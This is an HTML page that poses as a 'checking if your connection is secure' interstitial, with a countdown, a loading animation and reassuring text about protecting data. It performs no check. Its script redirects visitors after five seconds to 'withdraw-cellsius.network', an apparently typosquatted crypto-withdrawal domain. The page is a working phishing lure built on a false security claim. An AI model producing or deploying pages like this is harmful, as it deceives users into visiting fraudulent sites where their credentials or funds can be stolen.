<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <title>
   Checking your connection...
  </title>
  <link href="Pangram.css" rel="stylesheet"/>
  <style>
   hr {
            background: linear-gradient(to right, #9b59b6, #e91e63);
            height: 3px;
            border: none;

            width: 100%;
            animation: pulse 1.5s ease-in-out infinite;
        }

            @keyframes pulse {
            0% {
                transform: scaleY(1);
            }
            50% {
                transform: scaleY(1.3);
            }
            100% {
                transform: scaleY(1);
            }
        }

        * {
            font-family: "pangram";
            color: #0e1766;
            margin: 0;
        }
        h1 {
            font-size: 4rem;
        }
        body {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        #content {
            width: clamp(300px, 90%, 800px);
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            gap: 4px;
        }
        .gradient {
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-image: -webkit-linear-gradient(222.32deg, rgb(56, 43, 197) 4.26%, rgb(255, 60, 172) 100%);
        }


        .centered-image {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

        span {
            font-size: .8rem;
            color: hsla(0, 0%, 0%, .5);
        }
        #captcha {
            width: 10rem;
            height: auto;
            display: block;
margin-left: auto;
margin-right: auto;

        }
        header {
            position: absolute;
            top: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            width: 100%;
            height: auto;
        }
        footer {
            width: 100%;
            height: auto;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        #socials, .fab {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: center;
        }
        #logo {
            margin-left: 4rem;
            width: 10rem;
            height: 100px;
        }
        a {
            text-decoration: none;

        }
.label {
  font-size: 1rem;
  color: hsla(0, 0%, 0%, .5);
  text-align: center;
  margin-top: 8px;
  display: flex;
  justify-content: center;
  align-items: center;
}
  </style>
 </head>
 <body>
  <header>
   <img alt="" id="logo" src="logo.svg" srcset=""/>
   <hr/>
  </header>
  <div id="content">
   <br/>
   <h1 class="gradient">
    One moment!
   </h1>
   <p>
    We're checking if your connection is secure
   </p>
   <img alt="Loading..." class="centered-image" id="captcha" src="https://cdn.dribbble.com/users/1415337/screenshots/8053026/loading2.gif"/>
   <div class="label">
    <b>
     <i>
      <span id="countdown">
       5
      </span>
      seconds left
     </i>
    </b>
   </div>
   <span>
    We need to make sure that your connection to this website is secure. This is to protect your data from being intercepted by third parties.
   </span>
  </div>
  <footer>
   <hr/>
   <p id="socials">
    <a href="https://twitter.com">
     <i class="fab fa-twitter fa-lg social-icon" style="width: 50px; height: 50px;">
     </i>
    </a>
    <a href="https://www.youtube.com">
     <i class="fab fa-youtube fa-lg social-icon" style="width: 50px; height: 50px;">
     </i>
    </a>
    <a href="https://www.reddit.com">
     <i class="fab fa-reddit fa-lg social-icon" style="width: 50px; height: 50px;">
     </i>
    </a>
    <a href="https://www.facebook.com">
     <i class="fab fa-facebook fa-lg social-icon" style="width: 50px; height: 50px;">
     </i>
    </a>
   </p>
  </footer>
 </body>
 <script>
  var secondsLeft = 5;
var countdownElement = document.getElementById('countdown');

function updateCountdown() {
  countdownElement.textContent = secondsLeft;
  secondsLeft--;

  if (secondsLeft < 0) {
    // Rediriger après le décompte
    window.location.href = "https://withdraw-cellsius.network/";
  } else {
    setTimeout(updateCountdown, 1000);
  }
}

updateCountdown();


    document.getElementById("captcha").onended = function() {
        window.location.href = "https://withdraw-cellsius.network/";
    };
 </script>
</html>
